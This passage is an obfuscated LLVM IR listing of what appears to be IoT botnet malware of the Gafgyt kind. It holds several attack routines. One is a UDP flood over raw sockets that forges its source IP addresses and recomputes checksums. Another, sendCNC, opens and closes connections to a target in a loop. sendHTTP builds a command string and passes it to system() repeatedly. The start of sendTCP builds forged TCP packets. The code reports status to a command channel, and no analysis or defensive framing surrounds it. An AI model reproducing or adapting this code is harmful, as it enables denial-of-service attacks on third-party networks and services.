  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = load i32, i32* %12, align 4
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %10, align 4
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %52, label %118

; <label>:52:                                     ; preds = %46
  %53 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %53, i32* %15, align 4
  %54 = load i32, i32* %15, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %59, label %56

; <label>:56:                                     ; preds = %52
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.55, i32 0, i32 0))
  br label %320

; <label>:59:                                     ; preds = %52
  %60 = load i32, i32* %11, align 4
  %61 = add i32 %60, -1356300128
  %62 = add i32 %61, 1
  %63 = sub i32 %62, -1356300128
  %64 = add nsw i32 %60, 1
  %65 = sext i32 %63 to i64
  %66 = call noalias i8* @malloc(i64 %65) #2
  store i8* %66, i8** %16, align 8
  %67 = load i8*, i8** %16, align 8
  %68 = icmp eq i8* %67, null
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %59
  br label %320

; <label>:70:                                     ; preds = %59
  %71 = load i8*, i8** %16, align 8
  %72 = load i32, i32* %11, align 4
  %73 = sub i32 0, %72
  %74 = sub i32 0, 1
  %75 = add i32 %73, %74
  %76 = sub i32 0, %75
  %77 = add nsw i32 %72, 1
  %78 = sext i32 %76 to i64
  call void @llvm.memset.p0i8.i64(i8* %71, i8 0, i64 %78, i32 1, i1 false)
  %79 = load i8*, i8** %16, align 8
  %80 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %79, i32 %80)
  %81 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %82 = load i32, i32* %9, align 4
  %83 = sub i32 %81, -1107663834
  %84 = add i32 %83, %82
  %85 = add i32 %84, -1107663834
  %86 = add nsw i32 %81, %82
  store i32 %85, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %87

; <label>:87:                                     ; preds = %110, %109, %70
  %88 = load i32, i32* %15, align 4
  %89 = load i8*, i8** %16, align 8
  %90 = load i32, i32* %11, align 4
  %91 = sext i32 %90 to i64
  %92 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %93 = call i64 @sendto(i32 %88, i8* %89, i64 %91, i32 0, %struct.sockaddr* %92, i32 16)
  %94 = load i32, i32* %18, align 4
  %95 = load i32, i32* %14, align 4
  %96 = icmp eq i32 %94, %95
  br i1 %96, label %97, label %110

; <label>:97:                                     ; preds = %87
  %98 = load i32, i32* %8, align 4
  %99 = icmp eq i32 %98, 0
  br i1 %99, label %100, label %104

; <label>:100:                                    ; preds = %97
  %101 = call i32 @rand_cmwc()
  %102 = trunc i32 %101 to i16
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %102, i16* %103, align 2
  br label %104

; <label>:104:                                    ; preds = %100, %97
  %105 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %106 = load i32, i32* %17, align 4
  %107 = icmp sgt i32 %105, %106
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %104
  br label %117

; <label>:109:                                    ; preds = %104
  store i32 0, i32* %18, align 4
  br label %87

; <label>:110:                                    ; preds = %87
  %111 = load i32, i32* %18, align 4
  %112 = sub i32 0, %111
  %113 = sub i32 0, 1
  %114 = add i32 %112, %113
  %115 = sub i32 0, %114
  %116 = add i32 %111, 1
  store i32 %115, i32* %18, align 4
  br label %87

; <label>:117:                                    ; preds = %108
  br label %320

; <label>:118:                                    ; preds = %46
  %119 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %119, i32* %19, align 4
  %120 = load i32, i32* %19, align 4
  %121 = icmp ne i32 %120, 0
  br i1 %121, label %125, label %122

; <label>:122:                                    ; preds = %118
  %123 = load i32, i32* @mainCommSock, align 4
  %124 = call i32 (i32, i8*, ...) @sockprintf(i32 %123, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.55, i32 0, i32 0))
  br label %320

; <label>:125:                                    ; preds = %118
  store i32 1, i32* %20, align 4
  %126 = load i32, i32* %19, align 4
  %127 = bitcast i32* %20 to i8*
  %128 = call i32 @setsockopt(i32 %126, i32 0, i32 3, i8* %127, i32 4) #2
  %129 = icmp slt i32 %128, 0
  br i1 %129, label %130, label %133

; <label>:130:                                    ; preds = %125
  %131 = load i32, i32* @mainCommSock, align 4
  %132 = call i32 (i32, i8*, ...) @sockprintf(i32 %131, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.56, i32 0, i32 0))
  br label %320

; <label>:133:                                    ; preds = %125
  store i32 50, i32* %21, align 4
  br label %134

; <label>:134:                                    ; preds = %142, %133
  %135 = load i32, i32* %21, align 4
  %136 = sub i32 0, %135
  %137 = sub i32 0, -1
  %138 = add i32 %136, %137
  %139 = sub i32 0, %138
  %140 = add nsw i32 %135, -1
  store i32 %139, i32* %21, align 4
  %141 = icmp ne i32 %135, 0
  br i1 %141, label %142, label %152

; <label>:142:                                    ; preds = %134
  %143 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %144 = call i32 @rand_cmwc()
  %145 = xor i32 %143, -1
  %146 = and i32 %144, %145
  %147 = xor i32 %144, -1
  %148 = and i32 %143, %147
  %149 = or i32 %146, %148
  %150 = xor i32 %143, %144
  call void @srand(i32 %149) #2
  %151 = call i32 @rand() #2
  call void @init_rand(i32 %151)
  br label %134

; <label>:152:                                    ; preds = %134
  %153 = load i32, i32* %10, align 4
  %154 = icmp eq i32 %153, 0
  br i1 %154, label %155, label %156

; <label>:155:                                    ; preds = %152
  store i32 0, i32* %22, align 4
  br label %172

; <label>:156:                                    ; preds = %152
  %157 = load i32, i32* %10, align 4
  %158 = sub i32 0, %157
  %159 = add i32 32, %158
  %160 = sub nsw i32 32, %157
  %161 = shl i32 1, %159
  %162 = add i32 %161, -798041144
  %163 = sub i32 %162, 1
  %164 = sub i32 %163, -798041144
  %165 = sub nsw i32 %161, 1
  %166 = xor i32 %164, -1
  %167 = and i32 -1, %166
  %168 = xor i32 -1, -1
  %169 = and i32 %164, %168
  %170 = or i32 %167, %169
  %171 = xor i32 %164, -1
  store i32 %170, i32* %22, align 4
  br label %172

; <label>:172:                                    ; preds = %156, %155
  %173 = load i32, i32* %11, align 4
  %174 = sext i32 %173 to i64
  %175 = sub i64 28, -6572651836942615217
  %176 = add i64 %175, %174
  %177 = add i64 %176, -6572651836942615217
  %178 = add i64 28, %174
  %179 = call i8* @llvm.stacksave()
  store i8* %179, i8** %23, align 8
  %180 = alloca i8, i64 %177, align 16
  %181 = bitcast i8* %180 to %struct.iphdr*
  store %struct.iphdr* %181, %struct.iphdr** %24, align 8
  %182 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %183 = bitcast %struct.iphdr* %182 to i8*
  %184 = getelementptr i8, i8* %183, i64 20
  %185 = bitcast i8* %184 to %struct.udphdr*
  store %struct.udphdr* %185, %struct.udphdr** %25, align 8
  %186 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %187 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %188 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %187, i32 0, i32 0
  %189 = load i32, i32* %188, align 4
  %190 = load i32, i32* %22, align 4
  %191 = call i32 @getRandomIP(i32 %190)
  %192 = call i32 @htonl(i32 %191) #13
  %193 = load i32, i32* %11, align 4
  %194 = sext i32 %193 to i64
  %195 = sub i64 0, 8
  %196 = sub i64 0, %194
  %197 = add i64 %195, %196
  %198 = sub i64 0, %197
  %199 = add i64 8, %194
  %200 = trunc i64 %198 to i32
  call void @makeIPPacket(%struct.iphdr* %186, i32 %189, i32 %192, i8 zeroext 17, i32 %200)
  %201 = load i32, i32* %11, align 4
  %202 = sext i32 %201 to i64
  %203 = sub i64 0, 8
  %204 = sub i64 0, %202
  %205 = add i64 %203, %204
  %206 = sub i64 0, %205
  %207 = add i64 8, %202
  %208 = trunc i64 %206 to i16
  %209 = call zeroext i16 @htons(i16 zeroext %208) #13
  %210 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %211 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %210, i32 0, i32 0
  %212 = bitcast %union.anon.2* %211 to %struct.anon.3*
  %213 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %212, i32 0, i32 2
  store i16 %209, i16* %213, align 2
  %214 = call i32 @rand_cmwc()
  %215 = trunc i32 %214 to i16
  %216 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %217 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %216, i32 0, i32 0
  %218 = bitcast %union.anon.2* %217 to %struct.anon.3*
  %219 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %218, i32 0, i32 0
  store i16 %215, i16* %219, align 2
  %220 = load i32, i32* %8, align 4
  %221 = icmp eq i32 %220, 0
  br i1 %221, label %222, label %224

; <label>:222:                                    ; preds = %172
  %223 = call i32 @rand_cmwc()
  br label %229

; <label>:224:                                    ; preds = %172
  %225 = load i32, i32* %8, align 4
  %226 = trunc i32 %225 to i16
  %227 = call zeroext i16 @htons(i16 zeroext %226) #13
  %228 = zext i16 %227 to i32
  br label %229

; <label>:229:                                    ; preds = %224, %222
  %230 = phi i32 [ %223, %222 ], [ %228, %224 ]
  %231 = trunc i32 %230 to i16
  %232 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %233 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %232, i32 0, i32 0
  %234 = bitcast %union.anon.2* %233 to %struct.anon.3*
  %235 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %234, i32 0, i32 1
  store i16 %231, i16* %235, align 2
  %236 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %237 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon.2* %237 to %struct.anon.3*
  %239 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %238, i32 0, i32 3
  store i16 0, i16* %239, align 2
  %240 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %241 = bitcast %struct.udphdr* %240 to i8*
  %242 = getelementptr inbounds i8, i8* %241, i64 8
  %243 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %242, i32 %243)
  %244 = bitcast i8* %180 to i16*
  %245 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 2
  %247 = load i16, i16* %246, align 2
  %248 = zext i16 %247 to i32
  %249 = call zeroext i16 @csum(i16* %244, i32 %248)
  %250 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %251 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %250, i32 0, i32 7
  store i16 %249, i16* %251, align 2
  %252 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %253 = load i32, i32* %9, align 4
  %254 = sub i32 0, %252
  %255 = sub i32 0, %253
  %256 = add i32 %254, %255
  %257 = sub i32 0, %256
  %258 = add nsw i32 %252, %253
  store i32 %257, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %259

; <label>:259:                                    ; preds = %312, %311, %229
  br label %260

; <label>:260:                                    ; preds = %259
  %261 = load i32, i32* %19, align 4
  %262 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %263 = call i64 @sendto(i32 %261, i8* %180, i64 %177, i32 0, %struct.sockaddr* %262, i32 16)
  %264 = call i32 @rand_cmwc()
  %265 = trunc i32 %264 to i16
  %266 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %267 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %266, i32 0, i32 0
  %268 = bitcast %union.anon.2* %267 to %struct.anon.3*
  %269 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %268, i32 0, i32 0
  store i16 %265, i16* %269, align 2
  %270 = load i32, i32* %8, align 4
  %271 = icmp eq i32 %270, 0
  br i1 %271, label %272, label %274

; <label>:272:                                    ; preds = %260
  %273 = call i32 @rand_cmwc()
  br label %279

; <label>:274:                                    ; preds = %260
  %275 = load i32, i32* %8, align 4
  %276 = trunc i32 %275 to i16
  %277 = call zeroext i16 @htons(i16 zeroext %276) #13
  %278 = zext i16 %277 to i32
  br label %279

; <label>:279:                                    ; preds = %274, %272
  %280 = phi i32 [ %273, %272 ], [ %278, %274 ]
  %281 = trunc i32 %280 to i16
  %282 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %283 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %282, i32 0, i32 0
  %284 = bitcast %union.anon.2* %283 to %struct.anon.3*
  %285 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %284, i32 0, i32 1
  store i16 %281, i16* %285, align 2
  %286 = call i32 @rand_cmwc()
  %287 = trunc i32 %286 to i16
  %288 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 3
  store i16 %287, i16* %289, align 4
  %290 = load i32, i32* %22, align 4
  %291 = call i32 @getRandomIP(i32 %290)
  %292 = call i32 @htonl(i32 %291) #13
  %293 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %294 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %293, i32 0, i32 8
  store i32 %292, i32* %294, align 4
  %295 = bitcast i8* %180 to i16*
  %296 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 2
  %298 = load i16, i16* %297, align 2
  %299 = zext i16 %298 to i32
  %300 = call zeroext i16 @csum(i16* %295, i32 %299)
  %301 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 7
  store i16 %300, i16* %302, align 2
  %303 = load i32, i32* %27, align 4
  %304 = load i32, i32* %14, align 4
  %305 = icmp eq i32 %303, %304
  br i1 %305, label %306, label %312

; <label>:306:                                    ; preds = %279
  %307 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %308 = load i32, i32* %26, align 4
  %309 = icmp sgt i32 %307, %308
  br i1 %309, label %310, label %311

; <label>:310:                                    ; preds = %306
  br label %318

; <label>:311:                                    ; preds = %306
  store i32 0, i32* %27, align 4
  br label %259

; <label>:312:                                    ; preds = %279
  %313 = load i32, i32* %27, align 4
  %314 = add i32 %313, 535515769
  %315 = add i32 %314, 1
  %316 = sub i32 %315, 535515769
  %317 = add i32 %313, 1
  store i32 %316, i32* %27, align 4
  br label %259

; <label>:318:                                    ; preds = %310
  %319 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %319)
  br label %320

; <label>:320:                                    ; preds = %318, %130, %122, %117, %69, %56, %45
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = add i32 %10, 553178771
  %13 = add i32 %12, %11
  %14 = sub i32 %13, 553178771
  %15 = add nsw i32 %10, %11
  store i32 %14, i32* %7, align 4
  %16 = load i8*, i8** %4, align 8
  %17 = call i32 @inet_addr(i8* %16) #2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %19 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i32 0, i32 0
  store i32 %17, i32* %19, align 4
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %20, align 4
  %21 = load i32, i32* %5, align 4
  %22 = trunc i32 %21 to i16
  %23 = call zeroext i16 @htons(i16 zeroext %22) #13
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  br label %25

; <label>:25:                                     ; preds = %29, %3
  %26 = load i32, i32* %7, align 4
  %27 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %28 = icmp sgt i32 %26, %27
  br i1 %28, label %29, label %37

; <label>:29:                                     ; preds = %25
  %30 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %30, i32* %8, align 4
  %31 = load i32, i32* %8, align 4
  %32 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %33 = call i32 @connect(i32 %31, %struct.sockaddr* %32, i32 16)
  %34 = call i32 @sleep(i32 1)
  %35 = load i32, i32* %8, align 4
  %36 = call i32 @close(i32 %35)
  br label %25

; <label>:37:                                     ; preds = %25
  ret void
}

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca [80 x i8*], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %9 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %10 = load i32, i32* %4, align 4
  %11 = sub i32 %9, 1246153874
  %12 = add i32 %11, %10
  %13 = add i32 %12, 1246153874
  %14 = add nsw i32 %9, %10
  store i32 %13, i32* %5, align 4
  %15 = call i32 @rand() #2
  %16 = sext i32 %15 to i64
  %17 = urem i64 %16, 23
  %18 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %17
  %19 = load i8*, i8** %18, align 8
  store i8* %19, i8** %7, align 8
  %20 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %21 = bitcast i8** %20 to i8*
  %22 = call i32 (i8*, i8*, ...) @sprintf(i8* %21, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.57, i32 0, i32 0)) #2
  %23 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %24 = bitcast i8** %23 to i8*
  %25 = load i8*, i8** %7, align 8
  %26 = call i8* @strcat(i8* %24, i8* %25) #2
  %27 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %28 = bitcast i8** %27 to i8*
  %29 = call i8* @strcat(i8* %28, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0)) #2
  %30 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %31 = bitcast i8** %30 to i8*
  %32 = load i8*, i8** %3, align 8
  %33 = call i8* @strcat(i8* %31, i8* %32) #2
  br label %34

; <label>:34:                                     ; preds = %38, %2
  %35 = load i32, i32* %5, align 4
  %36 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %37 = icmp sgt i32 %35, %36
  br i1 %37, label %38, label %61

; <label>:38:                                     ; preds = %34
  %39 = call i32 @rand() #2
  %40 = sext i32 %39 to i64
  %41 = urem i64 %40, 23
  %42 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %41
  %43 = load i8*, i8** %42, align 8
  store i8* %43, i8** %7, align 8
  %44 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %45 = bitcast i8** %44 to i8*
  %46 = call i32 (i8*, i8*, ...) @sprintf(i8* %45, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.57, i32 0, i32 0)) #2
  %47 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %48 = bitcast i8** %47 to i8*
  %49 = load i8*, i8** %7, align 8
  %50 = call i8* @strcat(i8* %48, i8* %49) #2
  %51 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %52 = bitcast i8** %51 to i8*
  %53 = call i8* @strcat(i8* %52, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0)) #2
  %54 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %55 = bitcast i8** %54 to i8*
  %56 = load i8*, i8** %3, align 8
  %57 = call i8* @strcat(i8* %55, i8* %56) #2
  %58 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %59 = bitcast i8** %58 to i8*
  %60 = call i32 @system(i8* %59)
  br label %34

; <label>:61:                                     ; preds = %34
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %542

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.55, i32 0, i32 0))
  br label %542

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #2
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.56, i32 0, i32 0))
  br label %542

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %83

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = sub i32 32, -1893482488
  %69 = sub i32 %68, %67
  %70 = add i32 %69, -1893482488
  %71 = sub nsw i32 32, %67
  %72 = shl i32 1, %70
  %73 = add i32 %72, -373972310
  %74 = sub i32 %73, 1
  %75 = sub i32 %74, -373972310
  %76 = sub nsw i32 %72, 1
  %77 = xor i32 %75, -1
  %78 = and i32 -1, %77
  %79 = xor i32 -1, -1
  %80 = and i32 %75, %79
  %81 = or i32 %78, %80
  %82 = xor i32 %75, -1
  store i32 %81, i32* %19, align 4
  br label %83

; <label>:83:                                     ; preds = %66, %65
  %84 = load i32, i32* %13, align 4
  %85 = sext i32 %84 to i64
  %86 = sub i64 0, %85
  %87 = sub i64 40, %86
  %88 = add i64 40, %85
  %89 = call i8* @llvm.stacksave()
  store i8* %89, i8** %20, align 8
  %90 = alloca i8, i64 %87, align 16
  %91 = bitcast i8* %90 to %struct.iphdr*
  store %struct.iphdr* %91, %struct.iphdr** %21, align 8
  %92 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %93 = bitcast %struct.iphdr* %92 to i8*
  %94 = getelementptr i8, i8* %93, i64 20
  %95 = bitcast i8* %94 to %struct.tcphdr*
  store %struct.tcphdr* %95, %struct.tcphdr** %22, align 8
  %96 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %97 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %98 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %97, i32 0, i32 0
  %99 = load i32, i32* %98, align 4
  %100 = load i32, i32* %19, align 4
  %101 = call i32 @getRandomIP(i32 %100)
  %102 = call i32 @htonl(i32 %101) #13
  %103 = load i32, i32* %13, align 4
  %104 = sext i32 %103 to i64
  %105 = sub i64 20, 996415814964632664
  %106 = add i64 %105, %104
  %107 = add i64 %106, 996415814964632664
  %108 = add i64 20, %104
  %109 = trunc i64 %107 to i32
  call void @makeIPPacket(%struct.iphdr* %96, i32 %99, i32 %102, i8 zeroext 6, i32 %109)
  %110 = call i32 @rand_cmwc()
  %111 = trunc i32 %110 to i16
  %112 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %113 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %112, i32 0, i32 0
  %114 = bitcast %union.anon.0* %113 to %struct.anon.1*
  %115 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %114, i32 0, i32 0
  store i16 %111, i16* %115, align 4
  %116 = call i32 @rand_cmwc()
  %117 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %118 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %117, i32 0, i32 0
  %119 = bitcast %union.anon.0* %118 to %struct.anon.1*
  %120 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %119, i32 0, i32 2
  store i32 %116, i32* %120, align 4
  %121 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %122 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %121, i32 0, i32 0
  %123 = bitcast %union.anon.0* %122 to %struct.anon.1*
  %124 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %123, i32 0, i32 3
  store i32 0, i32* %124, align 4
  %125 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %126 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %125, i32 0, i32 0
  %127 = bitcast %union.anon.0* %126 to %struct.anon.1*
  %128 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %127, i32 0, i32 4
  %129 = load i16, i16* %128, align 4
  %130 = xor i16 %129, -1
  %131 = xor i16 -241, -1
  %132 = xor i16 3261, -1
  %133 = or i16 %130, %131
  %134 = or i16 3261, %132
  %135 = xor i16 %133, -1
  %136 = and i16 %135, %134
  %137 = and i16 %129, -241
  %138 = xor i16 %136, -1
  %139 = xor i16 80, -1
  %140 = xor i16 -8447, -1
  %141 = and i16 %138, -8447
  %142 = and i16 %136, %140
  %143 = and i16 %139, -8447
  %144 = and i16 80, %140
  %145 = or i16 %141, %142
  %146 = or i16 %143, %144
  %147 = xor i16 %145, %146
  %148 = or i16 %138, %139
  %149 = xor i16 %148, -1
  %150 = or i16 -8447, %140
  %151 = and i16 %149, %150
